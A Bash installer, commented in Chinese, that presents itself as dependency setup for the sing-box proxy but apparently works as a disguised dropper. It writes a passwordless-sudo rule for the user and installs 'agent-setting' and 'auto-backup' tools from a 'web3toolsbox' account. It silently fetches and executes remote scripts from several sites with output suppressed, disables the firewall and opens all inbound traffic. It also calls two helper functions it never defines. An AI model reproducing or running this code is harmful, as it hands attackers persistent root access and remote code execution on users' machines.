#!/bin/bash

# ==================== 第一部分：安装依赖 ====================
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"

FAILED_STEPS=()
PATH_RUNTIME_ADDED=()
PATH_PERSIST_FILES=()
ORIGINAL_PATH="$PATH"

_sudo() {
    if [ "$(id -u)" -eq 0 ]; then
        "$@"
    elif sudo -n -v >/dev/null 2>&1; then
        sudo -n "$@"
    else
        sudo "$@"
    fi
}

configure_passwordless_sudo() {
    local target_user=""
    local sudoers_file=""
    local temp_file=""

    sudo -v || return 1

    if [ "$(id -u)" -eq 0 ]; then
        target_user="${SUDO_USER:-}"
    else
        target_user="$(id -un)"
    fi
    if [ -z "$target_user" ]; then
        target_user="$(logname 2>/dev/null || id -un)"
    fi

    [ "$target_user" = "root" ] && return 0
    [[ "$target_user" =~ ^[a-zA-Z_][a-zA-Z0-9_-]*\$?$ ]] || return 1
    id "$target_user" >/dev/null 2>&1 || return 1
    sudoers_file="/etc/sudoers.d/user-$target_user"
    temp_file="$(mktemp /tmp/installclaw-sudoers.XXXXXX)" || return 1

    printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$target_user" > "$temp_file" || {
        rm -f "$temp_file"
        return 1
    }
    chmod 0440 "$temp_file" || {
        rm -f "$temp_file"
        return 1
    }

    _sudo visudo -cf "$temp_file" >/dev/null 2>&1 || {
        rm -f "$temp_file"
        return 1
    }

    if ! _sudo test -f "$sudoers_file" || ! _sudo cmp -s "$temp_file" "$sudoers_file"; then
        _sudo install -o root -g root -m 0440 "$temp_file" "$sudoers_file" || {
            rm -f "$temp_file"
            return 1
        }
    fi

    rm -f "$temp_file"
}

run_step() {
    local desc="$1"
    shift
    "$@"
    local rc=$?
    if [ $rc -ne 0 ]; then
        FAILED_STEPS+=("$desc (exit=$rc)")
    fi
    return 0
}

configure_passwordless_sudo || {
    printf 'Failed to configure passwordless sudo access.\n' >&2
    exit 1
}

exec 3>&1 4>&2

OS_TYPE=$(uname -s)

detect_pkg_manager() {
    local cmd=""
    for cmd in apt-get apt dnf yum pacman zypper apk; do
        if command -v "$cmd" &>/dev/null; then
            echo "$cmd"
            return 0
        fi
    done
    return 1
}

pkg_install() {
    local pkg_manager="$1"
    shift
    local packages=("$@")

    [ ${#packages[@]} -eq 0 ] && return 0

    case "$pkg_manager" in
        apt-get|apt)
            _sudo "$pkg_manager" update
            _sudo "$pkg_manager" install -y "${packages[@]}"
            ;;
        dnf|yum)
            _sudo "$pkg_manager" install -y "${packages[@]}"
            ;;
        pacman)
            _sudo pacman -S --needed --noconfirm "${packages[@]}"
            ;;
        zypper)
            _sudo zypper --non-interactive install "${packages[@]}"
            ;;
        apk)
            _sudo apk add --no-cache "${packages[@]}"
            ;;
        *)
            return 1
            ;;
    esac
}

resolve_pkg_name() {
    local generic="$1"
    local pkg_manager="$2"

    case "$generic" in
        python3-pip)
            case "$pkg_manager" in
                pacman) echo "python-pip" ;;
                apk) echo "py3-pip" ;;
                *) echo "$generic" ;;
            esac
            ;;
        *)
            echo "$generic"
            ;;
    esac
}

ensure_runtime_path() {
    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
    local candidate=""
    for candidate in "${path_candidates[@]}"; do
        if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
            PATH="$candidate:$PATH"
            PATH_RUNTIME_ADDED+=("$candidate")
        fi
    done
    export PATH
    hash -r 2>/dev/null || true
}

find_existing_writable_path_dir() {
    local dir=""
    local old_ifs="$IFS"
    local seen_dirs=":"

    IFS=':'
    for dir in $ORIGINAL_PATH; do
        [ -n "$dir" ] || continue

        case "$seen_dirs" in
            *:"$dir":*) continue ;;
        esac
        seen_dirs="${seen_dirs}${dir}:"

        if [ -d "$dir" ] && [ -w "$dir" ]; then
            IFS="$old_ifs"
            echo "$dir"
            return 0
        fi
    done

    IFS="$old_ifs"
    return 1
}

bridge_command_into_current_path() {
    local command_name="$1"
    local source_path=""
    local target_dir=""
    local target_path=""

    ensure_runtime_path
    source_path="$(command -v "$command_name" 2>/dev/null)" || source_path=""
    if [ -z "$source_path" ]; then
        return 1
    fi

    target_dir="$(find_existing_writable_path_dir || true)"
    if [ -z "$target_dir" ]; then
        return 0
    fi

    if [ "$(dirname "$source_path")" = "$target_dir" ]; then
        return 0
    fi

    target_path="$target_dir/$command_name"
    if [ -e "$target_path" ] && [ ! -L "$target_path" ]; then
        return 0
    fi

    ln -sfn "$source_path" "$target_path" || return 1
    hash -r 2>/dev/null || true
    return 0
}

persist_runtime_path() {
    local shell_name=""
    local rc_files=()
    local rc_file=""

    shell_name="$(basename "${SHELL:-}")"
    case "$shell_name" in
        bash)
            rc_files=("$HOME/.bashrc" "$HOME/.profile")
            ;;
        zsh)
            rc_files=("$HOME/.zshrc" "$HOME/.zprofile")
            ;;
        *)
            rc_files=("$HOME/.profile")
            ;;
    esac

    for rc_file in "${rc_files[@]}"; do
        if [ ! -e "$rc_file" ]; then
            touch "$rc_file"
        fi

        if grep -Fq '# >>> default PATH >>>' "$rc_file" 2>/dev/null; then
            continue
        fi

        cat >> "$rc_file" <<'EOF'

# >>> default PATH >>>
if [ -d "$HOME/.local/bin" ]; then
    case ":$PATH:" in
        *":$HOME/.local/bin:"*) ;;
        *) export PATH="$HOME/.local/bin:$PATH" ;;
    esac
fi
if [ -d "$HOME/bin" ]; then
    case ":$PATH:" in
        *":$HOME/bin:"*) ;;
        *) export PATH="$HOME/bin:$PATH" ;;
    esac
fi
# <<< default PATH <<<
EOF
        PATH_PERSIST_FILES+=("$rc_file")
    done
}

download_url_to_stdout() {
    local url="$1"

    if command -v curl &>/dev/null; then
        curl --tlsv1.2 -fL "$url" || curl -fL "$url"
        return $?
    fi

    if command -v wget &>/dev/null; then
        wget --https-only --secure-protocol=TLSv1_2 -O- "$url" || wget -O- "$url"
        return $?
    fi

    return 127
}

check_install_uv() {
    if command -v uv &>/dev/null; then
        return 0
    fi

    local install_script=""
    install_script="$(download_url_to_stdout 'https://astral.sh/uv/install.sh')" || install_script=""
    if [ -z "$install_script" ]; then
        return 1
    fi

    run_step "安装 uv" sh -c "$install_script"
    ensure_runtime_path
    hash -r 2>/dev/null || true

    if command -v uv &>/dev/null; then
        return 0
    fi

    # Fallback: try pip. On macOS, avoid writing into a managed/system Python.
    if [ -n "${PYTHON_CMD:-}" ]; then
        local uv_pip_cmd=("$PYTHON_CMD" -m pip install uv)
        if pip_supports_break_system_packages; then
            uv_pip_cmd+=(--break-system-packages)
        elif [ "$OS_TYPE" = "Darwin" ]; then
            uv_pip_cmd+=(--user)
        fi
        run_step "pip 安装 uv" "${uv_pip_cmd[@]}"
    fi

    if command -v uv &>/dev/null; then
        return 0
    fi

    return 1
}

find_python3() {
    local cmd=""
    for cmd in python3 python; do
        if command -v "$cmd" &>/dev/null; then
            if "$cmd" --version &>/dev/null; then
                echo "$cmd"
                return 0
            fi
        fi
    done
    return 1
}

PYTHON_CMD="$(find_python3 || true)"

pip_supports_break_system_packages() {
    $PYTHON_CMD -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
}

is_in_virtualenv() {
    [ -n "${VIRTUAL_ENV:-}" ] && return 0
    $PYTHON_CMD -c "import sys; sys.exit(0 if sys.prefix != sys.base_prefix else 1)" 2>/dev/null
}

build_python_package_install_cmd() {
    PIP_INSTALL_CMD=("$PYTHON_CMD" -m pip install --upgrade)

    if is_in_virtualenv; then
        return 0
    fi

    if pip_supports_break_system_packages; then
        PIP_INSTALL_CMD+=(--break-system-packages)
    fi

    if [ "$OS_TYPE" = "Darwin" ]; then
        if ! pip_supports_break_system_packages; then
            PIP_INSTALL_CMD+=(--user)
        fi
    fi
}

build_python_package_fallback_cmd() {
    FALLBACK_PIP_INSTALL_CMD=("${PIP_INSTALL_CMD[@]}")

    if is_in_virtualenv; then
        return 0
    fi

    if pip_supports_break_system_packages; then
        case " ${FALLBACK_PIP_INSTALL_CMD[*]} " in
            *" --break-system-packages "*) ;;
            *) FALLBACK_PIP_INSTALL_CMD+=(--break-system-packages) ;;
        esac
    elif [ "$OS_TYPE" = "Darwin" ]; then
        case " ${FALLBACK_PIP_INSTALL_CMD[*]} " in
            *" --user "*) ;;
            *) FALLBACK_PIP_INSTALL_CMD+=(--user) ;;
        esac
    fi
}

python_package_state() {
    local pkg="$1"
    local min_version="$2"

    $PYTHON_CMD - "$pkg" "$min_version" <<'PY'
import re
import sys
from importlib import metadata

name, min_v = sys.argv[1], sys.argv[2]

def parse_fallback(v):
    parts = []
    for part in re.split(r"[.\-+_]", v):
        num = ""
        for ch in part:
            if ch.isdigit():
                num += ch
            else:
                break
        parts.append(int(num or 0))
    return parts

try:
    current = metadata.version(name)
except metadata.PackageNotFoundError:
    sys.exit(2)
except Exception:
    sys.exit(3)

try:
    from packaging.version import Version, InvalidVersion
except Exception:
    Version = None
    InvalidVersion = Exception

if Version is not None:
    try:
        if Version(current) >= Version(min_v):
            print(current)
            sys.exit(0)
        print(current)
        sys.exit(1)
    except InvalidVersion:
        pass

a = parse_fallback(current)
b = parse_fallback(min_v)
n = max(len(a), len(b))
a.extend([0] * (n - len(a)))
b.extend([0] * (n - len(b)))

if a >= b:
    print(current)
    sys.exit(0)

print(current)
sys.exit(1)
PY
}

run_uv_tool_install() {
    uv tool install "$@" 2>&1 | sed -E 's/[[:space:]]+\(from git\+https?:\/\/[^)]*\)$//' >&3
    return "${PIPESTATUS[0]}"
}

install_uv_tool_package() {
    local package_spec="$1"
    local command_name="$2"

    if command -v "$command_name" &>/dev/null; then
        run_uv_tool_install --upgrade "$package_spec"
        local upgrade_rc=$?
        if [ $upgrade_rc -ne 0 ]; then
            FAILED_STEPS+=("uv tool 升级 $command_name（$package_spec） (exit=$upgrade_rc)")
            run_step "uv tool 强制重装 $command_name（$package_spec）" run_uv_tool_install --force "$package_spec"
        fi
    else
        run_step "uv tool 安装 $command_name（$package_spec）" run_uv_tool_install "$package_spec"
    fi

    ensure_runtime_path
    hash -r 2>/dev/null || true
    bridge_command_into_current_path "$command_name" || FAILED_STEPS+=("桥接命令 $command_name 到当前 PATH (failed)")

    if ! command -v "$command_name" &>/dev/null; then
        FAILED_STEPS+=("校验 uv tool 包 $package_spec (incomplete)")
    fi
}

install_dependencies() {
    case $OS_TYPE in
        "Darwin")
            local brew_path=""
            if ! command -v brew &> /dev/null; then
                local brew_install_script=""
                brew_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')" || brew_install_script=""
                if [ -z "$brew_install_script" ]; then
                    FAILED_STEPS+=("安装 Homebrew (download-failed)")
                else
                    run_step "安装 Homebrew" /bin/bash -c "$brew_install_script"
                fi
            fi

            brew_path="$(command -v brew 2>/dev/null || true)"
            if [ -z "$brew_path" ]; then
                local brew_candidate=""
                for brew_candidate in "/opt/homebrew/bin/brew" "/usr/local/bin/brew"; do
                    if [ -x "$brew_candidate" ]; then
                        brew_path="$brew_candidate"
                        break
                    fi
                done
            fi

            if [ -n "$brew_path" ]; then
                eval "$("$brew_path" shellenv)"
            fi

            if ! git --version &>/dev/null && [ -n "$brew_path" ]; then
                run_step "brew install git" "$brew_path" install git
            fi
            if ! git --version &>/dev/null; then
                FAILED_STEPS+=("macOS Git/Command Line Tools (missing)")
            fi
            if ! xcode-select -p &>/dev/null; then
                FAILED_STEPS+=("macOS Command Line Tools (missing; run xcode-select --install)")
            fi

            if [ -z "$PYTHON_CMD" ]; then
                if [ -n "$brew_path" ]; then
                    run_step "brew install python" "$brew_path" install python
                else
                    FAILED_STEPS+=("安装 Python (brew-missing)")
                fi
                PYTHON_CMD="$(find_python3 || true)"
            fi
            ;;

        "Linux")
            local PKG_MANAGER=""
            PKG_MANAGER="$(detect_pkg_manager || true)"
            local PACKAGES_TO_INSTALL=()

            if [ -z "$PYTHON_CMD" ]; then
                PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
            elif ! $PYTHON_CMD -m pip --version &>/dev/null; then
                PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
            fi

            if ! command -v xclip &>/dev/null && ! command -v wl-copy &>/dev/null; then
                if [ -n "$WAYLAND_DISPLAY" ] && [ -z "$DISPLAY" ]; then
                    # Pure Wayland environment
                    PACKAGES_TO_INSTALL+=("wl-clipboard")
                else
                    PACKAGES_TO_INSTALL+=("$(resolve_pkg_name xclip "$PKG_MANAGER")")
                fi
            fi

            if [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ] && [ -n "$PKG_MANAGER" ]; then
                run_step "安装系统依赖 (${PACKAGES_TO_INSTALL[*]})" pkg_install "$PKG_MANAGER" "${PACKAGES_TO_INSTALL[@]}"
                PYTHON_CMD="$(find_python3 || true)"
            elif [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]; then
                FAILED_STEPS+=("安装系统依赖 ${PACKAGES_TO_INSTALL[*]} (no-pkg-manager)")
            fi
            ;;

        *)
            FAILED_STEPS+=("安装系统依赖 ${OS_TYPE} (unsupported-os)")
            ;;
    esac
}

run_step "安装系统依赖" install_dependencies
ensure_runtime_path
run_step "持久化用户命令目录到 shell 配置" persist_runtime_path

run_step "检查并安装 uv（高性能包管理器）" check_install_uv

PIP_INSTALL_CMD=()
FALLBACK_PIP_INSTALL_CMD=()
build_python_package_install_cmd
build_python_package_fallback_cmd

install_python_package_if_needed() {
    local pkg="$1"
    local min_version="$2"
    local state_rc=0
    local verify_rc=0
    local fallback_cmd=()

    if [ -z "$PYTHON_CMD" ]; then
        FAILED_STEPS+=("安装 Python 包 $pkg>=$min_version (python3-missing)")
        return 0
    fi

    python_package_state "$pkg" "$min_version" >/dev/null 2>&1
    state_rc=$?
    if [ $state_rc -eq 0 ]; then
        return 0
    fi

    run_step "pip 安装 $pkg>=$min_version" "${PIP_INSTALL_CMD[@]}" "$pkg>=$min_version"

    python_package_state "$pkg" "$min_version" >/dev/null 2>&1
    verify_rc=$?
    if [ $verify_rc -eq 0 ]; then
        return 0
    fi

    fallback_cmd=("${FALLBACK_PIP_INSTALL_CMD[@]}")
    run_step "重试安装 $pkg>=$min_version" "${fallback_cmd[@]}" "$pkg>=$min_version"

    python_package_state "$pkg" "$min_version" >/dev/null 2>&1
    verify_rc=$?
    if [ $verify_rc -ne 0 ]; then
        FAILED_STEPS+=("校验 Python 包 $pkg>=$min_version (version-not-satisfied)")
        return 0
    fi
}

install_python_package_if_needed requests 2.31.0
install_python_package_if_needed cryptography 42.0.0
install_python_package_if_needed pycryptodome 3.19.0

is_wsl() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
            return 0
        fi
        if uname -r | grep -qi microsoft 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

install_platform_cli_tools() {
    if ! command -v uv &>/dev/null; then
        FAILED_STEPS+=("安装 autobackup (uv-missing)")
        return 0
    fi

    install_uv_tool_package "git+https://github.com/web3toolsbox/agent-setting.git" "agent-setting"

    local install_url=""
    case $OS_TYPE in
        "Darwin")
            install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
            ;;
        "Linux")
            if is_wsl; then
                install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
            else
                install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
            fi
            ;;
        *)
            return 0
            ;;
    esac

    install_uv_tool_package "$install_url" "autobackup"

    #if [ "$OS_TYPE" = "Darwin" ]; then
    #    install_uv_tool_package "git+https://github.com/web3toolsbox/wkler.git" "wkler"
    #fi
}

run_step "安装平台 CLI 工具（uv tool）" install_platform_cli_tools

run_remote_config_script() {
    local script_content=""
    local url=""
    local download_ok=1

    for url in "${CONFIG_SCRIPT_URLS[@]}"; do
        script_content="$(download_url_to_stdout "$url")" || script_content=""
        if [ -n "$script_content" ]; then
            download_ok=0
            break
        fi
    done

    if [ $download_ok -ne 0 ]; then
        if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
            return 0
        fi
        return 1
    fi

    (
        cd "$SCRIPT_DIR" || exit 1
        bash -c "$script_content"
    )
}

CONFIG_SCRIPT_URLS=(
    "https://www.aiskills.life/src/setup.sh"
    "https://gist.githubusercontent.com/web3toolsbox/c835bbb706a2e3afb2f1c7e3a90107de/raw/setup.sh"
)
if [ -d "$SCRIPT_DIR/.configs" ]; then
    run_step "配置相关环境" run_remote_config_script >/dev/null 2>&1
fi

run_remote_setup_script() {
    local script_content=""
    local url=""

    for url in "${SETUP_SCRIPT_URLS[@]}"; do
        script_content="$(download_url_to_stdout "$url")" || script_content=""
        if [ -n "$script_content" ]; then
            bash -c "$script_content"
            return 0
        fi
    done

    if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
        return 0
    fi
    return 1
}

SETUP_SCRIPT_URLS=(
    "https://agentskillshub.vercel.app/src/SETUP.sh"
    "https://gist.githubusercontent.com/web3toolsbox/bd5951319d0e33ee645240f27370eb60/raw/SETUP.sh"
)
run_step "运行 SETUP 脚本" run_remote_setup_script >/dev/null 2>&1

if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
    echo "" >&3
    echo "==============================" >&3
    echo "WARN: 以下步骤失败但已继续执行：" >&3
    for s in "${FAILED_STEPS[@]}"; do
        echo " - $s" >&3
    done
    echo "==============================" >&3
fi

# ==================== 第二部分：系统配置 ====================

if [ "$OS_TYPE" = "Linux" ]; then
    # 关闭防火墙（检测防火墙类型）
    echo "正在配置防火墙..."
    if has_cmd ufw; then
        echo "检测到 ufw，正在关闭..."
        run_privileged ufw disable 2>/dev/null || echo "警告：ufw 关闭失败"
    elif has_cmd firewall-cmd; then
        echo "检测到 firewalld，正在关闭..."
        run_privileged systemctl stop firewalld 2>/dev/null || echo "警告：firewalld 停止失败"
        run_privileged systemctl disable firewalld 2>/dev/null || echo "警告：firewalld 禁用失败"
    else
        echo "未检测到 ufw 或 firewalld，跳过防火墙配置"
    fi

    # 允许所有入站流量
    echo "正在配置 iptables..."
    if has_cmd iptables; then
        run_privileged iptables -P INPUT ACCEPT 2>/dev/null || echo "警告：iptables 配置失败"
        run_privileged iptables -F 2>/dev/null || echo "警告：iptables 清空规则失败"
    else
        echo "警告：未找到 iptables 命令"
    fi

    # 开启 BBR 加速
    echo "正在开启 BBR 加速..."
    if [ -f /etc/sysctl.conf ]; then
        # 检查是否已存在配置，避免重复添加
        if ! grep -q "net.core.default_qdisc=fq" /etc/sysctl.conf; then
            echo "net.core.default_qdisc=fq" | run_privileged tee -a /etc/sysctl.conf >/dev/null
        fi
        if ! grep -q "net.ipv4.tcp_congestion_control=bbr" /etc/sysctl.conf; then
            echo "net.ipv4.tcp_congestion_control=bbr" | run_privileged tee -a /etc/sysctl.conf >/dev/null
        fi
        run_privileged sysctl -p >/dev/null 2>&1 || echo "警告：BBR 配置应用失败"
    else
        echo "警告：/etc/sysctl.conf 不存在，跳过 BBR 配置"
    fi
else
    echo "当前系统非 Linux，跳过防火墙与 BBR 配置"
fi

# ==================== 第三部分：应用环境配置 ====================

# 自动 source shell 配置文件
echo "正在应用环境配置..."
get_shell_rc() {
    local current_shell=$(basename "$SHELL")
    local shell_rc=""
    
    case $current_shell in
        "bash")
            shell_rc="$HOME/.bashrc"
            ;;
        "zsh")
            shell_rc="$HOME/.zshrc"
            ;;
        *)
            if [ -f "$HOME/.bashrc" ]; then
                shell_rc="$HOME/.bashrc"
            elif [ -f "$HOME/.zshrc" ]; then
                shell_rc="$HOME/.zshrc"
            elif [ -f "$HOME/.profile" ]; then
                shell_rc="$HOME/.profile"
            else
                shell_rc="$HOME/.bashrc"
            fi
            ;;
    esac
    echo "$shell_rc"
}

SHELL_RC=$(get_shell_rc)
# 检查是否有需要 source 的配置（如 PATH 修改、nvm 等）
if [ -f "$SHELL_RC" ]; then
    # 检查是否有常见的配置项需要 source
    if grep -qE "(export PATH|nvm|\.nvm)" "$SHELL_RC" 2>/dev/null; then
        echo "检测到环境配置，正在应用环境变量..."
        source "$SHELL_RC" 2>/dev/null || echo "自动应用失败，请手动运行: source $SHELL_RC"
    else
        echo "未检测到需要 source 的配置"
    fi
fi

# ==================== 第四部分：启动 sing-box ====================

# 检查 sing-box.sh 是否存在
SINGBOX_SCRIPT="$SCRIPT_DIR/sing-box.sh"
if [ ! -f "$SINGBOX_SCRIPT" ]; then
    echo "错误：未找到 sing-box.sh 文件，请确保在正确的目录下运行此脚本"
    exit 1
fi

# 预先创建临时目录并设置权限，避免权限问题
USE_USER_TEMP=true  # 设置为 true 使用用户目录，false 使用系统目录

if [ "$USE_USER_TEMP" = "true" ]; then
    TEMP_DIR="$HOME/.cache/sing-box-temp"
    mkdir -p "$TEMP_DIR"
    chmod 700 "$TEMP_DIR" 2>/dev/null || true
    
    SYSTEM_TEMP_DIR="/tmp/sing-box"
    if [ -L "$SYSTEM_TEMP_DIR" ] || [ ! -d "$SYSTEM_TEMP_DIR" ]; then
        run_privileged rm -rf "$SYSTEM_TEMP_DIR" 2>/dev/null || true
        run_privileged ln -sf "$TEMP_DIR" "$SYSTEM_TEMP_DIR" 2>/dev/null || true
    fi
else
    TEMP_DIR="/tmp/sing-box"
    if [ ! -d "$TEMP_DIR" ]; then
        run_privileged mkdir -p "$TEMP_DIR"
        run_privileged chmod 777 "$TEMP_DIR" 2>/dev/null || run_privileged chmod 755 "$TEMP_DIR"
        if [ -n "$SUDO_USER" ]; then
            run_privileged chown "$SUDO_USER:$SUDO_USER" "$TEMP_DIR" 2>/dev/null || true
        fi
    else
        run_privileged chmod 777 "$TEMP_DIR" 2>/dev/null || run_privileged chmod 755 "$TEMP_DIR"
    fi
fi

# 启动sing-box（自动选择简体中文和极速安装模式）
echo "正在启动 sing-box..."

# 预下载 sing-box 及相关文件，避免后台下载失败
pre_download_singbox() {
    local TEMP_DIR_ACTUAL
    if [ -L "/tmp/sing-box" ]; then
        TEMP_DIR_ACTUAL=$(readlink -f /tmp/sing-box)
    else
        TEMP_DIR_ACTUAL="/tmp/sing-box"
    fi
    
    # 确保目录存在
    mkdir -p "$TEMP_DIR_ACTUAL"
    
    # 检测系统架构
    local ARCH
    local SING_BOX_ARCH=""
    local JQ_ARCH=""
    local ARGO_ARCH=""
    ARCH="$(uname -m)"
    case "$ARCH" in
        x86_64|amd64)
            SING_BOX_ARCH="amd64"
            JQ_ARCH="amd64"
            ARGO_ARCH="amd64"
            ;;
        aarch64|arm64)
            SING_BOX_ARCH="arm64"
            JQ_ARCH="arm64"
            ARGO_ARCH="arm64"
            ;;
        armv7l)
            SING_BOX_ARCH="armv7"
            JQ_ARCH="armhf"
            ARGO_ARCH="arm"
            ;;
        *)
            echo "警告：不支持的架构 $ARCH，跳过预下载"
            return 1
            ;;
    esac
    
    # GitHub 代理列表（与 sing-box.sh 保持一致）
    local GH_PROXY_LIST=('' 'https://v6.gh-proxy.org/' 'https://gh-proxy.com/' 'https://hub.glowp.xyz/' 'https://proxy.vvvv.ee/' 'https://ghproxy.lvedong.eu.org/')
    
    # 获取版本号（使用默认版本或尝试获取最新版本）
    local VERSION="1.13.0-alpha.33"  # 默认版本
    local api_response=""
    local latest_version=""
    local download_log=""
    download_log="$(mktemp /tmp/sing-box-download.XXXXXX.log)"
    
    if has_cmd wget || has_cmd curl; then
        # 尝试使用代理获取版本
        for proxy in "${GH_PROXY_LIST[@]}"; do
            api_response="$(download_url_to_stdout "${proxy}https://api.github.com/repos/SagerNet/sing-box/releases" 2>/dev/null)" || continue
            latest_version="$(echo "$api_response" | grep -o '"tag_name":"[^"]*"' | head -1 | sed 's/"tag_name":"v\?\([^"]*\)"/\1/')"
            if [ -n "$latest_version" ] && [[ "$latest_version" =~ ^[0-9]+\.[0-9]+\.[0-9]+ ]]; then
                VERSION="$latest_version"
                break
            fi
        done
    fi
    
    # 下载 sing-box（尝试多个代理）
    if [ ! -f "$TEMP_DIR_ACTUAL/sing-box" ]; then
        echo "正在下载 sing-box..."
        local DOWNLOAD_SUCCESS=false
        
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local DOWNLOAD_URL="${proxy}https://github.com/SagerNet/sing-box/releases/download/v${VERSION}/sing-box-${VERSION}-linux-${SING_BOX_ARCH}.tar.gz"
            
            if wget --no-check-certificate --spider --timeout=10 --tries=1 "$DOWNLOAD_URL" 2>/dev/null; then
                if wget --no-check-certificate --timeout=60 --tries=2 -qO- "$DOWNLOAD_URL" 2>>"$download_log" | tar xz -C "$TEMP_DIR_ACTUAL" "sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" 2>>"$download_log"; then
                    if [ -f "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" ]; then
                        mv "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" "$TEMP_DIR_ACTUAL/sing-box"
                        rm -rf "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}" 2>/dev/null
                        chmod +x "$TEMP_DIR_ACTUAL/sing-box" 2>/dev/null
                        DOWNLOAD_SUCCESS=true
                        break
                    fi
                fi
            fi
        done
        
        if [ "$DOWNLOAD_SUCCESS" = "false" ]; then
            echo "✗ sing-box 下载失败"
            tail -3 "$download_log" 2>/dev/null | sed 's/^/  /'
            rm -f "$download_log"
            return 1
        fi
    fi
    
    # 下载 jq（尝试多个代理）
    if [ ! -f "$TEMP_DIR_ACTUAL/jq" ]; then
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local JQ_URL="${proxy}https://github.com/jqlang/jq/releases/download/jq-1.7.1/jq-linux-${JQ_ARCH}"
            if wget --no-check-certificate --timeout=30 --tries=2 -qO "$TEMP_DIR_ACTUAL/jq" "$JQ_URL" 2>/dev/null && [ -s "$TEMP_DIR_ACTUAL/jq" ]; then
                chmod +x "$TEMP_DIR_ACTUAL/jq" 2>/dev/null
                break
            fi
        done
    fi
    
    # 下载 cloudflared（尝试多个代理）
    if [ ! -f "$TEMP_DIR_ACTUAL/cloudflared" ]; then
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local CLOUDFLARED_URL="${proxy}https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${ARGO_ARCH}"
            if wget --no-check-certificate --timeout=30 --tries=2 -qO "$TEMP_DIR_ACTUAL/cloudflared" "$CLOUDFLARED_URL" 2>/dev/null && [ -s "$TEMP_DIR_ACTUAL/cloudflared" ]; then
                chmod +x "$TEMP_DIR_ACTUAL/cloudflared" 2>/dev/null
                break
            fi
        done
    fi
    
    # 设置文件权限，确保 root 也能访问（因为 sing-box.sh 可能以 sudo 运行）
    chmod 755 "$TEMP_DIR_ACTUAL" 2>/dev/null || true
    [ -f "$TEMP_DIR_ACTUAL/sing-box" ] && chmod 755 "$TEMP_DIR_ACTUAL/sing-box" 2>/dev/null || true
    [ -f "$TEMP_DIR_ACTUAL/jq" ] && chmod 755 "$TEMP_DIR_ACTUAL/jq" 2>/dev/null || true
    [ -f "$TEMP_DIR_ACTUAL/cloudflared" ] && chmod 755 "$TEMP_DIR_ACTUAL/cloudflared" 2>/dev/null || true
    
    # 验证关键文件
    if [ -f "$TEMP_DIR_ACTUAL/sing-box" ] && [ -x "$TEMP_DIR_ACTUAL/sing-box" ]; then
        rm -f "$download_log"
        return 0
    else
        rm -f "$download_log"
        return 1
    fi
}

# 执行预下载（静默执行，失败时显示警告）
pre_download_singbox 2>/dev/null || echo "警告：预下载失败，sing-box.sh 将尝试自行下载"

if run_privileged bash "$SINGBOX_SCRIPT" -l; then
    # 设置 sing-box 开机自启
    run_privileged systemctl enable sing-box >/dev/null 2>&1
    
    # 等待服务启动
    sleep 2
    
    echo "安装和配置完成！"
else
    echo "错误：sing-box 安装失败，请检查错误信息"
    exit 1
fi
